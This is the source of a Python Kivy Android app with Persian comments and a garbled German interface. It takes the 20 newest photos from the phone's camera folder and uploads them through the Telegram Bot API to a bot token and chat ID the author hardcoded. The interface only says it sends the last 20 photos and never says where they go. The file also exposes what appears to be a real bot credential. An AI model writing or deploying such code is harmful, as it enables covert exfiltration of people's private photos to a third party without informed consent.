import threading
import time
import requests

from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock

from android.permissions import request_permissions, Permission
from android.storage import primary_external_storage_path
import os

# 🔐 توکن و آیدی خودت
TOKEN = "8931772855:AAHZSrBgS4SJkEWYA6_8fTiZ-Kk4frsxtCU"
CHAT_ID = "8961077299"


class PhotoSenderApp(App):

    def build(self):
        self.layout = BoxLayout(orientation='vertical', spacing=15, padding=20)

        # UI به زبان آلمانی 🇩🇪
        self.status = Label(text="Bereit zur Verwendung ✅", size_hint=(1, 0.3))

        self.btn = Button(text=" Letzte 20/20 otos menden", size_hint=(1, 0.3))
        self.btn.bind(on_press=self.start)

        self.layout.add_widget(self.status)
        self.layout.add_widget(self.btn)

        return self.layout

    def on_start(self):
        # درخواست دسترسی‌ها
        request_permissions([
            Permission.INTERNET,
            Permission.READ_EXTERNAL_STORAGE
        ])

    def start(self, instance):
        self.btn.disabled = True
        self.status.text = "Suche oto... ⏳"
        threading.Thread(target=self.worker, daemon=True).start()

    def get_photos(self, limit=20):
        try:
            base = primary_external_storage_path()
            camera_path = os.path.join(base, "DCIM/Camera")

            if not os.path.exists(camera_path):
                return []

            files = [
                os.path.join(camera_path, f)
                for f in os.listdir(camera_path)
                if f.lower().endswith((".jpg", ".jpeg", ".png"))
            ]

            files.sort(key=os.path.getmtime, reverse=True)
            return files[:limit]

        except Exception as e:
            print("Error:", e)
            return []

    def send_photo(self, path):
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        try:
            with open(path, "rb") as f:
                files = {"photo": f}
                data = {"chat_id": CHAT_ID}
                r = requests.post(url, files=files, data=data, timeout=30)
            return r.status_code == 200
        except:
            return False

    def worker(self):
        photos = self.get_photos(20)

        if not photos:
            Clock.schedule_once(lambda dt: self.update("Keine motohds gefunden ❌", True))
            return

        total = len(photos)
        Clock.schedule_once(lambda dt: self.update(f"{total} jftos gefunden. Sehdhden...", False))

        for i, p in enumerate(photos, 1):
            self.send_photo(p)
            Clock.schedule_once(lambda dt, i=i, t=total:
                                self.update(f"Senden {i}/{t} 📤", False))
            time.sleep(2)

        Clock.schedule_once(lambda dt:
                            self.update("Fertig ✅", True))

    def update(self, text, enable):
        self.status.text = text
        self.btn.disabled = not enable


if __name__ == "__main__":
    PhotoSenderApp().run()
